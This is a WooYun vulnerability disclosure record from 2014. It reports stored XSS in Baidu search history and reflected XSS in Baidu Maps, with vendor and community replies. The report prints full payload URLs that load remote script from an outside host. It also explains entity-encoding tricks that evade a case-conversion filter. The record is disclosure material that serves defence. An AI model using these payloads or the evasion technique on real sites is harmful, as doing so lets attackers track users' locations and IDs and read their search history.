{"id": 818, "wybug_id": "wooyun-2014-073801", "wybug_title": "百度搜索存储型XSS漏洞", "wybug_corp": "百度", "wybug_author": "q601333824", "wybug_date": "2014-08-25 17:37", "wybug_open_date": "2014-10-09 17:38", "wybug_type": "xss跨站脚本攻击", "wybug_level": "低", "wybug_rank_0": "3", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["存储型"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-08-25：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-08-25：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-09-04：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-09-14：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-09-24：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-10-09：\t细节向公众公开  简要描述： 百度搜索存储型XSS漏洞 详细说明：      1.在百度搜索的东西，会在百度个人中心留下搜索历史记录    2.所以我在百度搜索 \nhttp://www.baidu.com/s?wd=%22onmouseover =%22var%20s=document.create%26%2369%3blement('script');s.src='http://fripside.sinaapp.com/';document.body.append%26%2367%3bhild(s);%22\n      3.在个人中心会留下记录，会出现XSS漏洞，如图 \n\n    4.上面连接，会把大写字母转换到小写字母，控制台会报错,如图 \n\n   5.因为下面图上两个本来应该大写的字母变成小写字母了 \n\n   6.所以要把大写B和大写C，转码之就不会报错了 \nB → &#66; → %26%2366%3b\n \nC → &#67; → %26%2367%3b\n-----------------------------------------------------------------------------------   7.这个是self XSS吗？？百度搜索每天用的人那么多，如果乱七八糟的网站，强制你搜索这段代码，就不是跨自己了.如果网站这样呢，如图 \n\n------------------------------------------------------------------------------------------   8.这里顺便也提交个百度地图另外一边的XSS漏洞，就不会废话了，直接上连接 \nhttp://map.baidu.com/?newmap=1&shareurl=1&l=15&tn=B_NORMAL_MAP&c=13376526,3516728&i=0,1,1&s=bt%26bttp%3D0%26c%3D179%26sy%3D0%26en%3D1%24%24d506b2fea993829688b988e8%24%2413373701.000000%2C3516044.000000%24%24%E8%A5%BF%E6%B9%96%E5%8C%BA'onmouseover%253d%22var%20e%253ddocument.createElement('script');e.setAttribute('src','http://fripside.sinaapp.com/aaaaaa.js');document.body.appendChild(e)%22style%253d%22font-size:999px;cursor:%20default%20!important;%24%24%24%24%24%24%26sn%3D1%24%24f9fd6062990a5b1e0f0e6be9%24%2413379295.000000%2C3516515.000000%24%24%E5%8F%8C%E7%89%9B%E5%A4%A7%E5%8E%A6%24%24%24%24%24%24%26sq%3D%E8%A5%BF%E6%B9%96%E5%8C%BA%26eq%3D%E5%8F%8C%E7%89%9B%E5%A4%A7%E5%8E%A6%26exptype%3Ddep%26exptime%3D2014-08-23%2004%3A10%26version%3D5\n  9.访问之后把鼠标移到左边就会获取地理位置和用户ID \n\n   漏洞证明：    1.百度个人中心XSS代码 \nhttp://www.baidu.com/s?wd=%22onmouseover =%22var%20s=document.create%26%2369%3blement('script');s.src='http://fripside.sinaapp.com/';document.body.append%26%2367%3bhild(s);%22\n \n\n  2.百度地图XSS \nhttp://map.baidu.com/?newmap=1&shareurl=1&l=15&tn=B_NORMAL_MAP&c=13376526,3516728&i=0,1,1&s=bt%26bttp%3D0%26c%3D179%26sy%3D0%26en%3D1%24%24d506b2fea993829688b988e8%24%2413373701.000000%2C3516044.000000%24%24%E8%A5%BF%E6%B9%96%E5%8C%BA'onmouseover%253d%22var%20e%253ddocument.createElement('script');e.setAttribute('src','http://fripside.sinaapp.com/aaaaaa.js');document.body.appendChild(e)%22style%253d%22font-size:999px;cursor:%20default%20!important;%24%24%24%24%24%24%26sn%3D1%24%24f9fd6062990a5b1e0f0e6be9%24%2413379295.000000%2C3516515.000000%24%24%E5%8F%8C%E7%89%9B%E5%A4%A7%E5%8E%A6%24%24%24%24%24%24%26sq%3D%E8%A5%BF%E6%B9%96%E5%8C%BA%26eq%3D%E5%8F%8C%E7%89%9B%E5%A4%A7%E5%8E%A6%26exptype%3Ddep%26exptime%3D2014-08-23%2004%3A10%26version%3D5\n \n\n   修复方案：  百度个人中心虽然无法获取到cook,但是可以获取用户的搜索历史记录，百度地图虽然获取不到cook,但是可以获取ID对应所在地点1.百度个人中心因为双引号被过滤，百度地图因为单引号没过滤,百度地图，前两次修复，只是修复了输出点，不是我吹牛，治标不治本，过滤方式会导致出现同样的问题   版权声明：转载请注明来源 q601333824@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：6  确认时间：2014-08-25 21:52 厂商回复： 感谢提交，我们已联系业务部门处理此问题。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-08-25 17:56 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  你关注的白帽子 q601333824 发表了漏洞 百度搜索存储型XSS漏洞    \n     2014-08-25 18:01 |    \t\t浩天  \t\t\t( 普通白帽子  |\t\t\t        Rank:915 漏洞数:79        | 度假中...)\t\t \n  你关注的白帽子 q601333824 发表了漏洞 百度搜索存储型XSS漏洞     \n     2014-08-26 08:51 |    \t\t233 \t\t\t( 路人 |\t\t\t        Rank:14 漏洞数:4        | 小孩子看了根本把持不住)\t\t \n  你关注的白帽子 q601333824 发表了漏洞 百度搜索存储型XSS漏洞     \n     2014-08-29 08:04 |    \t\t天际 \t\t\t( 路人 |\t\t\t        Rank:3 漏洞数:1        | 我只是在打酱油)\t\t \n  你关注的白帽子 q601333824 发表了漏洞 百度搜索存储型XSS漏洞    \n     2014-10-02 21:28 |    \t\t老和尚 \t\t\t( 普通白帽子  |\t\t\t        Rank:223 漏洞数:45        | 总有一天，我会骑着雨牛@'雨。踩着一哥@jan...)\t\t \n  你email多少？    \n     2014-10-09 18:26 |    \t\t鱼化石 \t\t\t( 实习白帽子  |\t\t\t        Rank:93 漏洞数:18        | 介绍不能为空)\t\t \n  表示没处理掉    \n     2014-10-09 18:30 |    \t\tq601333824 \t\t\t( 普通白帽子  |\t\t\t        Rank:217 漏洞数:49        | 出自《丹特丽安的书架》---吾问汝,汝为人否...)\t\t \n  @鱼化石 后来用新号查看，那个功能是关闭状态，没开的，毕竟有点鸡肋，记录浏览记录的功能感觉没多少人用    \n     2014-10-09 20:24 |    \t\t大漠長河 \t\t\t( 实习白帽子  |\t\t\t        Rank:43 漏洞数:7        | ̷̸̨̀͒̏̃ͦ̈́̾( 天龙源景区欢迎您...)\t\t \n  @q601333824 漠漠开着那学习了 有价值    \n     2014-10-10 00:36 |    \t\t苍崎深雪 \t\t\t( 路人 |\t\t\t        Rank:3 漏洞数:2        | 微光)\t\t \n  我看到了fripSide！    \n     2014-10-11 09:13 |    \t\t香草 \t\t\t( 实习白帽子  |\t\t\t        Rank:99 漏洞数:14        | javascript,xss,jsp、aspx)\t\t \n  地图这个有点意思，可以定位    \n     2014-10-25 21:20 |    \t\t大漠長河 \t\t\t( 实习白帽子  |\t\t\t        Rank:43 漏洞数:7        | ̷̸̨̀͒̏̃ͦ̈́̾( 天龙源景区欢迎您...)\t\t \n  拿走 学习用    \n     2015-04-26 15:16 |    \t\t昌维 \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:3        | QQ：867597730，百度贴吧ID：昌维001)\t\t \n  问题是有多少人会去闲的没事看自己的搜索记录。=_=    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 6, "Ranks": null}